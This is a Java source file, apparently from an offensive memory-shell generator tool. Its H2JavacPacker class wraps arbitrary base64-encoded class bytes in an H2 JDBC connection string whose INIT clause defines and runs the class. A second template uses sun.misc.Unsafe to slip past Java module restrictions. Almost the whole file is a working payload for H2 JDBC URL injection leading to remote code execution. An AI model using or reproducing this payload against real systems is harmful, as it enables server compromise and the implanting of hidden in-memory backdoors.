package org.leo.jmg.mem.packer.h2;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;

@PackerMeta(name = "H2Javac", group = "H2", order = 1)
public class H2JavacPacker implements Packer {
    private static final String COMPATIBLE_BASE64_DECODE =
            "byte[] bytes=null\\;" +
            "String base64Str=\"{{base64Str}}\"\\;" +
            "try{" +
            "java.lang.Class c=java.lang.Class.forName(\"java.util.Base64\")\\;" +
            "java.lang.Object d=c.getMethod(\"getDecoder\",new java.lang.Class[0]).invoke(null,new java.lang.Object[0])\\;" +
            "bytes=(byte[])d.getClass().getMethod(\"decode\",new java.lang.Class[]{java.lang.String.class}).invoke(d,new java.lang.Object[]{base64Str})\\;" +
            "}catch(java.lang.Throwable first){try{" +
            "java.lang.Class c=java.lang.Class.forName(\"javax.xml.bind.DatatypeConverter\")\\;" +
            "bytes=(byte[])c.getMethod(\"parseBase64Binary\",new java.lang.Class[]{java.lang.String.class}).invoke(null,new java.lang.Object[]{base64Str})\\;" +
            "}catch(java.lang.Throwable second){" +
            "java.lang.Class c=java.lang.Class.forName(\"sun.misc.BASE64Decoder\")\\;" +
            "java.lang.Object d=c.newInstance()\\;" +
            "bytes=(byte[])c.getMethod(\"decodeBuffer\",new java.lang.Class[]{java.lang.String.class}).invoke(d,new java.lang.Object[]{base64Str})\\;" +
            "}}";

    String template = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS look AS '" +
            "String a(String a) throws java.lang.Throwable{" +
            COMPATIBLE_BASE64_DECODE +
            "java.lang.reflect.Method defMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\",bytes.getClass(),int.class,int.class)\\;" +
            "defMethod.setAccessible(true)\\;" +
            "java.lang.Class myclass=(java.lang.Class)defMethod.invoke(new java.net.URLClassLoader(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()),bytes,0,bytes.length)\\;" +
            "myclass.newInstance()\\;" +
            "return null\\;" +
            "}'\\;" +
            "CALL look('')";
    String bypassTemplate = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS look AS '" +
            "String a(String a) throws java.lang.Throwable{" +
            COMPATIBLE_BASE64_DECODE +
            "try {" +
            "    java.lang.Class<?> unsafeClass = Class.forName(\"sun.misc.Unsafe\")\\;" +
            "    java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField(\"theUnsafe\")\\;" +
            "    unsafeField.setAccessible(true)\\;" +
            "    java.lang.Object unsafe = unsafeField.get(null)\\;" +
            "    java.lang.Object module = Class.class.getMethod(\"getModule\").invoke(java.lang.Object.class, (java.lang.Object[]) null)\\;" +
            "    java.lang.reflect.Method objectFieldOffsetM = unsafe.getClass().getMethod(\"objectFieldOffset\", java.lang.reflect.Field.class)\\;" +
            "    long offset = (Long) objectFieldOffsetM.invoke(unsafe, java.lang.Class.class.getDeclaredField(\"module\"))\\;" +
            "    java.lang.reflect.Method getAndSetObjectM = unsafe.getClass().getMethod(\"getAndSetObject\", java.lang.Object.class, long.class, java.lang.Object.class)\\;" +
            "    java.lang.StackTraceElement[] stackTraceElements = java.lang.Thread.currentThread().getStackTrace()\\;" +
            "    java.lang.Class<?> callerClass = java.lang.Class.forName(stackTraceElements[1].getClassName())\\;" +
            "    getAndSetObjectM.invoke(unsafe, callerClass, offset, module)\\;" +
            "} catch (Throwable e) {}" +
            "java.lang.reflect.Method defMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\",bytes.getClass(),int.class,int.class)\\;" +
            "defMethod.setAccessible(true)\\;" +
            "java.lang.Class myclass=(java.lang.Class)defMethod.invoke(new java.net.URLClassLoader(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()),bytes,0,bytes.length)\\;" +
            "myclass.newInstance()\\;" +
            "return null\\;" +
            "}'\\;" +
            "CALL look('')";

    @Override
    public String pack(ClassPackerConfig config) {
        if (config.isByPassJavaModule()) {
            return bypassTemplate.replace("{{base64Str}}", config.getClassBytesBase64Str());
        }
        return template.replace("{{base64Str}}", config.getClassBytesBase64Str());
    }
}
